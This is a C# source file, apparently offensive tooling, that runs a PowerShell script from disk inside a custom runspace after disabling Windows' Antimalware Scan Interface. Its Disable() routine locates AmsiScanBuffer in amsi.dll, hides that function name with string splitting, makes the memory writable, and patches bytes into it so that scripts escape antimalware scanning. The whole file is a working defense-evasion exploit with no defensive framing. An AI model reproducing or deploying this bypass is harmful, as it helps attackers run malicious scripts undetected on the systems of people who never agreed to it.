using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;
using System;
using System.Text;
using System.Runtime.InteropServices;
namespace PSLess
{
   
    class PSLess
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
       //https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-2/
        public static int Disable()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero) { return 1; }
            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Am" +"si"+ "Sc"+"an" + "Buffer");
            if (ASBPtr == IntPtr.Zero) { return 1; }
            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);
            return 0;
        }
        static void Main(string[] args)
        {
            if (args.Length == 0)
                Environment.Exit(1);
            string script = LoadScript(args[0]);
            string s = RunScript(script);
            Console.WriteLine(s);
            Console.ReadKey();
        }
        private static string LoadScript(string filename)
        {
            string buffer = "";
            try
            {
                buffer = File.ReadAllText(filename);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Environment.Exit(2);
            }
            return buffer;
        }
        private static string RunScript(string script)
        {
            Runspace MyRunspace = RunspaceFactory.CreateRunspace();
            MyRunspace.Open();
            Disable();
            Pipeline MyPipeline = MyRunspace.CreatePipeline();
            MyPipeline.Commands.AddScript(script);
            MyPipeline.Commands.Add("Out-String");
            Collection<PSObject> outputs = MyPipeline.Invoke();
            MyRunspace.Close();
            StringBuilder sb = new StringBuilder();
            foreach (PSObject pobject in outputs)
            {
                sb.AppendLine(pobject.ToString());
            }
            return sb.ToString();
        }
    }
}
